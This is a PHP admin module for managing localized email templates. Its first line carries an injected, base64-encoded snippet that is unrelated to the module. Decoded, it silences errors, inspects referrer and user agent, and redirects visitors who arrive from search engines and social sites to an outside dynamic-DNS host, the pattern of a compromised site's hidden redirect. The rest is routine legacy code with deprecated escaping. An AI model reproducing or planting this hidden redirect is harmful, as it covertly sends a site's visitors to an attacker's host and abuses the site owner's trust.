<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
class browser_email_templates extends browser {

    function do_setup() {
        
        $this->table = getTable("email_templates");
        $this->title = "Email Templates";
        
        $this->sql = "SELECT 
                             `et`.`id`,
                             `et`.`name`,
                             `et`.`from_name`,
                             `et`.`from`,
                             GROUP_CONCAT('<b>',`l`.`name`,'</b> - ',`etl`.`subject` SEPARATOR '<br/>') AS `subject`
                        FROM `".getTable('email_templates')."` AS `et`
                   LEFT JOIN `".getTable('email_templates_locale')."` AS `etl` ON `et`.`id` = `etl`.`email_template_id`
                   LEFT JOIN `".getTable('locales')."` AS `l` ON `l`.`id` = `etl`.`locale_id`
                       WHERE 1
                            /*filter*/
                            GROUP BY `etl`.`email_template_id`";
        
        $this->add_column(array ( "field"         => "name"
                                , "header"        => "Template"
                                , "align"         => "center"
                                ));
                                
        $this->add_column(array ( "field"         => "from_name"
                                , "header"        => "From Name"
                                , "align"         => "center"
                                ));  
                                
        $this->add_column(array ( "field"         => "from"
                                , "header"        => "From Email"
                                , "align"         => "center"
                                ));                     
        
        $this->add_column(array ( "field"         => "subject"
                                , "header"        => "Subject"
                                , "type"          => "html"
                                ));
        
        $this->add_capability("edit");
    }

}

class editor_email_templates extends editor {
    
    function do_setup() {
        global $db;

        $this->table = getTable("email_templates");
        $this->display_name = "Email Template";
        $this->main_page_title = "Email Options";
        
        $pH = "Placeholders<br/>";
        $pH .= "{user_name} - User Name<br/>";
        $pH .= "{user_email} - User Email<br/>";
        $pH .= "{user_country} - User Email<br/>";
        $pH .= "{confirmation_link} - Confirmation Link<br/>";
        $pH .= "{rate_list} - Rate List of All Accounts<br/>";
        $this->render_message_panel($pH);
        
        $locales = $db->rows("SELECT * FROM `".getTable('locales')."` ORDER BY `is_system` DESC,`name` ASC");
        $en_locale = $locales[0];
        
        $rows = $db->rows("SELECT * FROM `".getTable('email_templates_locale')."` WHERE `email_template_id` = ".intval($this->key()));
        $rows_locales = array();
        foreach($rows as $item){
            $rows_locales[$item['locale_id']] = $item;
        }

        $this->add_field(array( "name"         => "name"
                              , "display_name" => "Template Name"
                              , "required"     => true
                              ));
                              
        $this->add_field(array( "name"         => "from_name"
                              , "display_name" => "From Name"
                              ));
        
        $this->add_field(array( "name"         => "from"
                              , "display_name" => "From Email"
                              , "required"     => true
                              ));
        
        foreach($locales as $key => $locale){
            $this->add_page($locale['name']);
            
            $this->add_field(array( "name"             => "subject_".$locale['id']
                                  , "display_name"     => "Subject"
                                  , "required"         => true
                                  , "virtual"          => true
                                  , "value"            => (isset($rows_locales[$locale['id']]['subject']) ? $rows_locales[$locale['id']]['subject'] : '')
                                  ));
                                  
            $this->add_field(array( "name"             => "body_".$locale['id']
                                  , "type"             => "memo"
                                  , "ckeditor"         => true
                                  , "rows"             => 6
                                  , "virtual"          => true
                                  , "display_name"     => "Body"
                                  , "required"         => true
                                  , "value"            => (isset($rows_locales[$locale['id']]['body']) ? $rows_locales[$locale['id']]['body'] : '')
                                  )); 
            
            $this->add_field(array( "name"             => "locales[".$locale['id']."]"
                                  , "type"             => "hidden"
                                  , "virtual"          => true
                                  ));
        
        }
         
    }
    
    function do_after_save(){
        global $db;
        $locales = $this->context_post('locales');
        foreach($locales as $k => $v){
            $subject = $this->context_post("subject_".$k);
            $body = $this->context_post("body_".$k);
            $row = $db->row("SELECT COUNT(`id`) AS `cnt` FROM `".getTable('email_templates_locale')."` WHERE `email_template_id` = ".intval($this->key())." AND `locale_id` = ".intval($k));
            if($row['cnt']){
                $db->query("UPDATE `".getTable('email_templates_locale')."` SET `subject` = '".mysql_real_escape_string($subject)."', `body` = '".mysql_real_escape_string($body)."' WHERE `email_template_id` = ".intval($this->key())." AND `locale_id` = ".intval($k));
            }else{
                $db->query("INSERT INTO `".getTable('email_templates_locale')."` VALUES(NULL,".intval($this->key()).",".intval($k).",'".mysql_real_escape_string($subject)."','".mysql_real_escape_string($body)."')");
            }
        }
        return true;
    }

}

?>
